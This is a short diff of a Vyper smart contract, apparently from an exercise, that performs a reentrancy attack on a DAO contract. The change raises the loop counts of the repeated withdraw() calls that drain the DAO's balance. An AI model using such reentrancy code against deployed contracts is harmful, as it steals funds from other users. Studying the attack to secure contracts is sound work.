@@ -19,7 +19,7 @@ def _attack() -> bool:
     # Make sure you add a "base case" to end the recursion
     deposit_amount: uint256 = self.dao_address.balance
 
-    for n in range(0, 5000):
+    for n in range(0, 8000):
         if self.dao_address.balance > 0 :
             DAO(self.dao_address).withdraw()
         else:
@@ -41,7 +41,7 @@ def attack(dao_address:address):
     DAO(self.dao_address).deposit(value=deposit_amount)   
     
     # TODO: Start the reentrancy attack
-    for n in range(0, 5000):
+    for n in range(0, 8000):
         if self.dao_address.balance > 0 :
             self._attack()
         else:
